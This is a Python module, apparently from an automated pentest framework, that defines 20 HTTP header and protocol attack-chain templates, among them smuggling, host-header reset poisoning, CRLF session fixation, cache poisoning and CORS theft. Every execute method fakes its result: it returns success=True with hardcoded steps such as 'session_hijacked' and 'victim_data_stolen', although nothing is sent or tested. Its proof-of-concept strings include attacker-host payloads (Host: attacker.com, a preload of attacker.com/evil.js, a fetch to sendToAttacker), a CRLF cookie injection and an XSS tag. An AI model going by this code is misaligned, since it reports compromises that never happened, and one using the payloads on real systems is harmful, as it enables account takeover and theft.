# workers/chain_worker/chains/header_protocol.py
"""20 header/protocol chain templates."""
from __future__ import annotations

from datetime import datetime

from workers.chain_worker.registry import BaseChainTemplate, ChainContext, register_chain
from workers.chain_worker.models import (
    ChainViability, ChainResult, ChainStep, EvaluationResult, TargetFindings,
)
from workers.chain_worker.base_tool import step_delay, take_screenshot


def _ts() -> str:
    return datetime.utcnow().isoformat()


# ---------------------------------------------------------------------------
# 1. te_obfuscation_smuggling_hijack
# ---------------------------------------------------------------------------
@register_chain
class TeObfuscationSmugglingHijack(BaseChainTemplate):
    name = "te_obfuscation_smuggling_hijack"
    category = "header_protocol"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("smuggling") + findings.vulns_by_title_contains("transfer-encoding")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["smuggling_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["smuggling_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="send_obfuscated_te_header", target="front_end_proxy", result="te_header_misinterpreted", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="smuggle_second_request", target="backend_server", result="request_smuggled", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="hijack_next_user_request", target="victim_session", result="session_hijacked", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="Transfer-Encoding: chunked\\r\\nTransfer-encoding: x", chain_name=self.name)


# ---------------------------------------------------------------------------
# 2. xff_spoofing_ip_acl_bypass
# ---------------------------------------------------------------------------
@register_chain
class XffSpoofingIpAclBypass(BaseChainTemplate):
    name = "xff_spoofing_ip_acl_bypass"
    category = "header_protocol"
    severity_on_success = "high"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("X-Forwarded") + findings.vulns_by_title_contains("IP bypass")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["xff_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["xff_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="spoof_xff_header", target="protected_endpoint", result="ip_acl_bypassed", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="access_restricted_resource", target="admin_panel", result="unauthorized_access_gained", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="X-Forwarded-For: 127.0.0.1", chain_name=self.name)


# ---------------------------------------------------------------------------
# 3. range_header_info_leak
# ---------------------------------------------------------------------------
@register_chain
class RangeHeaderInfoLeak(BaseChainTemplate):
    name = "range_header_info_leak"
    category = "header_protocol"
    severity_on_success = "high"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("range") + findings.vulns_by_title_contains("partial content")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["range_header_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["range_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="send_range_request", target="file_endpoint", result="partial_content_returned", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="extract_adjacent_memory", target="response_body", result="sensitive_data_leaked", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="Range: bytes=0-1024 on multipart response to leak adjacent data", chain_name=self.name)


# ---------------------------------------------------------------------------
# 4. content_type_mismatch_injection
# ---------------------------------------------------------------------------
@register_chain
class ContentTypeMismatchInjection(BaseChainTemplate):
    name = "content_type_mismatch_injection"
    category = "header_protocol"
    severity_on_success = "high"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        ct = findings.vulns_by_title_contains("content-type")
        mm = findings.vulns_by_title_contains("mismatch")
        m = [v for v in ct if v in mm]
        if not m and not ct:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["content_type_mismatch_vulnerability"])
        if m:
            return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["ct_mismatch_found"], matched_findings={"vuln_id": m[0].id})
        return EvaluationResult(viability=ChainViability.PARTIAL, matched_preconditions=["content_type_found"], missing_preconditions=["mismatch_confirmed"])

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="send_mismatched_content_type", target="api_endpoint", result="parser_confused", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="inject_payload_via_mismatch", target="parser_differential", result="injection_achieved", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="Content-Type: application/json with XML body containing injection", chain_name=self.name)


# ---------------------------------------------------------------------------
# 5. expect_header_waf_bypass
# ---------------------------------------------------------------------------
@register_chain
class ExpectHeaderWafBypass(BaseChainTemplate):
    name = "expect_header_waf_bypass"
    category = "header_protocol"
    severity_on_success = "high"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("WAF") + findings.vulns_by_title_contains("expect")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["waf_expect_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["waf_bypass_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="send_expect_100_continue", target="waf_proxy", result="waf_skips_body_inspection", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="send_malicious_body", target="backend_server", result="payload_bypasses_waf", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="Expect: 100-continue with malicious body after 100 response", chain_name=self.name)


# ---------------------------------------------------------------------------
# 6. method_override_auth_bypass
# ---------------------------------------------------------------------------
@register_chain
class MethodOverrideAuthBypass(BaseChainTemplate):
    name = "method_override_auth_bypass"
    category = "header_protocol"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("method override") + findings.vulns_by_title_contains("X-HTTP-Method")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["method_override_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["method_override_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="send_post_with_method_override", target="protected_endpoint", result="method_overridden_to_put", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="bypass_auth_check", target="auth_middleware", result="auth_bypassed", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="modify_protected_resource", target="admin_resource", result="unauthorized_modification", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="POST /api/users/1 with X-HTTP-Method-Override: DELETE", chain_name=self.name)


# ---------------------------------------------------------------------------
# 7. trailer_header_cache_poison
# ---------------------------------------------------------------------------
@register_chain
class TrailerHeaderCachePoison(BaseChainTemplate):
    name = "trailer_header_cache_poison"
    category = "header_protocol"
    severity_on_success = "high"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("trailer") + findings.vulns_by_title_contains("chunked")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["trailer_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["trailer_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="send_chunked_with_trailer", target="proxy_cache", result="trailer_header_processed", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="poison_cache_via_trailer", target="cache_layer", result="cache_poisoned", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="Chunked response with Trailer: Cache-Control to poison cache entry", chain_name=self.name)


# ---------------------------------------------------------------------------
# 8. accept_language_debug_exposure
# ---------------------------------------------------------------------------
@register_chain
class AcceptLanguageDebugExposure(BaseChainTemplate):
    name = "accept_language_debug_exposure"
    category = "header_protocol"
    severity_on_success = "high"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("debug") + findings.vulns_by_title_contains("stack trace")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["debug_exposure_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["debug_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="send_invalid_accept_language", target="error_handler", result="debug_mode_triggered", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="extract_stack_trace", target="error_response", result="sensitive_info_leaked", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="Accept-Language: ../../../../etc/passwd to trigger debug trace", chain_name=self.name)


# ---------------------------------------------------------------------------
# 9. http_smuggling_cache_poison
# ---------------------------------------------------------------------------
@register_chain
class HttpSmugglingCachePoison(BaseChainTemplate):
    name = "http_smuggling_cache_poison"
    category = "header_protocol"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("smuggling") + findings.vulns_by_title_contains("CL/TE")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["http_smuggling_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["smuggling_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="smuggle_request_via_clte", target="front_end_proxy", result="request_boundary_confused", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="poison_cache_with_smuggled", target="cdn_cache", result="cache_serves_malicious_content", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="serve_poisoned_to_victims", target="cached_resource", result="mass_xss_via_cache", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="CL:TE desync to poison /static/main.js cache entry", chain_name=self.name)


# ---------------------------------------------------------------------------
# 10. host_header_reset_poisoning
# ---------------------------------------------------------------------------
@register_chain
class HostHeaderResetPoisoning(BaseChainTemplate):
    name = "host_header_reset_poisoning"
    category = "header_protocol"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("host header") + findings.vulns_by_title_contains("password reset")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["host_header_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["host_header_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="request_password_reset", target="reset_endpoint", result="reset_email_triggered", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="poison_host_header", target="Host_header", result="reset_link_points_to_attacker", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="capture_reset_token", target="attacker_server", result="token_captured_account_taken", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="Host: attacker.com on POST /reset-password?email=victim@target.com", chain_name=self.name)


# ---------------------------------------------------------------------------
# 11. crlf_injection_session_fixation
# ---------------------------------------------------------------------------
@register_chain
class CrlfInjectionSessionFixation(BaseChainTemplate):
    name = "crlf_injection_session_fixation"
    category = "header_protocol"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("CRLF")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["crlf_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["crlf_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="inject_crlf_in_header", target="redirect_endpoint", result="header_injected", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="set_attacker_session_cookie", target="Set-Cookie_header", result="session_fixated", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="victim_uses_fixed_session", target="victim_browser", result="session_hijacked", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="/redirect?url=%0d%0aSet-Cookie:%20session=attacker_controlled", chain_name=self.name)


# ---------------------------------------------------------------------------
# 12. cookie_tossing_session_override
# ---------------------------------------------------------------------------
@register_chain
class CookieTossingSessionOverride(BaseChainTemplate):
    name = "cookie_tossing_session_override"
    category = "header_protocol"
    severity_on_success = "high"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("cookie tossing") + findings.vulns_by_title_contains("subdomain cookie")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["cookie_tossing_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["cookie_tossing_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="set_cookie_from_subdomain", target="subdomain_xss", result="shadow_cookie_set", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="override_parent_session", target="parent_domain", result="session_overridden", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="document.cookie='session=attacker_val;domain=.target.com;path=/'", chain_name=self.name)


# ---------------------------------------------------------------------------
# 13. content_disposition_rfd
# ---------------------------------------------------------------------------
@register_chain
class ContentDispositionRfd(BaseChainTemplate):
    name = "content_disposition_rfd"
    category = "header_protocol"
    severity_on_success = "high"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("reflected file download") + findings.vulns_by_title_contains("content-disposition")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["rfd_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["rfd_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="craft_rfd_url", target="api_endpoint", result="download_triggered", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="victim_executes_downloaded_file", target="client_os", result="arbitrary_commands_run", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="/api/search;payload.bat?q=||calc||", chain_name=self.name)


# ---------------------------------------------------------------------------
# 14. csp_report_uri_exfil
# ---------------------------------------------------------------------------
@register_chain
class CspReportUriExfil(BaseChainTemplate):
    name = "csp_report_uri_exfil"
    category = "header_protocol"
    severity_on_success = "high"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        csp = findings.vulns_by_title_contains("CSP")
        rep = findings.vulns_by_title_contains("report")
        m = [v for v in csp if v in rep]
        if not m and not csp:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["csp_report_vulnerability"])
        if m:
            return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["csp_report_found"], matched_findings={"vuln_id": m[0].id})
        return EvaluationResult(viability=ChainViability.PARTIAL, matched_preconditions=["csp_found"], missing_preconditions=["report_uri_exploitable"])

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="inject_csp_violation", target="report_uri_endpoint", result="violation_report_generated", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="exfil_data_via_report", target="attacker_report_collector", result="sensitive_urls_leaked", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="Trigger CSP violation to exfil internal URLs via report-uri", chain_name=self.name)


# ---------------------------------------------------------------------------
# 15. etag_manipulation_cache_bypass
# ---------------------------------------------------------------------------
@register_chain
class EtagManipulationCacheBypass(BaseChainTemplate):
    name = "etag_manipulation_cache_bypass"
    category = "header_protocol"
    severity_on_success = "high"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("ETag") + findings.vulns_by_title_contains("cache bypass")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["etag_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["etag_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="manipulate_etag_header", target="cached_resource", result="cache_validation_bypassed", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="access_stale_content", target="protected_resource", result="stale_sensitive_data_accessed", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="If-None-Match: * to bypass cache validation and access stale content", chain_name=self.name)


# ---------------------------------------------------------------------------
# 16. vary_header_cache_poison
# ---------------------------------------------------------------------------
@register_chain
class VaryHeaderCachePoison(BaseChainTemplate):
    name = "vary_header_cache_poison"
    category = "header_protocol"
    severity_on_success = "high"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("Vary") + findings.vulns_by_title_contains("cache poison")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["vary_cache_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["vary_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="send_unkeyed_header", target="cdn_proxy", result="response_varies_on_unkeyed", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="poison_cache_variant", target="cache_layer", result="poisoned_variant_cached", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="X-Custom: <script>alert(1)</script> with Vary header not covering it", chain_name=self.name)


# ---------------------------------------------------------------------------
# 17. link_header_resource_injection
# ---------------------------------------------------------------------------
@register_chain
class LinkHeaderResourceInjection(BaseChainTemplate):
    name = "link_header_resource_injection"
    category = "header_protocol"
    severity_on_success = "high"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("Link header") + findings.vulns_by_title_contains("preload")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["link_header_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["link_header_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="inject_link_header", target="response_headers", result="preload_directive_injected", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="load_malicious_resource", target="browser_preload", result="attacker_script_loaded", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="Link: <http://attacker.com/evil.js>; rel=preload; as=script", chain_name=self.name)


# ---------------------------------------------------------------------------
# 18. forwarded_via_proxy_confusion
# ---------------------------------------------------------------------------
@register_chain
class ForwardedViaProxyConfusion(BaseChainTemplate):
    name = "forwarded_via_proxy_confusion"
    category = "header_protocol"
    severity_on_success = "high"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("proxy") + findings.vulns_by_title_contains("forwarded")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["proxy_forwarded_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["proxy_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="inject_forwarded_header", target="proxy_chain", result="routing_confused", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="access_internal_vhost", target="internal_application", result="internal_app_accessed", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="Forwarded: for=127.0.0.1;host=internal.target.com;proto=https", chain_name=self.name)


# ---------------------------------------------------------------------------
# 19. digest_auth_nonce_reuse
# ---------------------------------------------------------------------------
@register_chain
class DigestAuthNonceReuse(BaseChainTemplate):
    name = "digest_auth_nonce_reuse"
    category = "header_protocol"
    severity_on_success = "high"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("digest") + findings.vulns_by_title_contains("nonce")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["digest_nonce_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["digest_nonce_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="capture_auth_nonce", target="digest_challenge", result="nonce_captured", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="replay_with_stale_nonce", target="auth_endpoint", result="nonce_accepted", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="access_as_victim", target="protected_resource", result="unauthorized_access_via_replay", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="Replay captured Digest nonce with incremented nc counter", chain_name=self.name)


# ---------------------------------------------------------------------------
# 20. cors_misconfiguration_data_theft
# ---------------------------------------------------------------------------
@register_chain
class CorsMisconfigurationDataTheft(BaseChainTemplate):
    name = "cors_misconfiguration_data_theft"
    category = "header_protocol"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("CORS")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["cors_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["cors_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="verify_cors_misconfiguration", target="api_endpoint", result="origin_reflected_or_wildcard", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="craft_cross_origin_request", target="sensitive_api", result="credentials_included", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="exfiltrate_response_data", target="attacker_server", result="victim_data_stolen", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="fetch('https://target.com/api/me',{credentials:'include'}).then(r=>r.json()).then(d=>sendToAttacker(d))", chain_name=self.name)
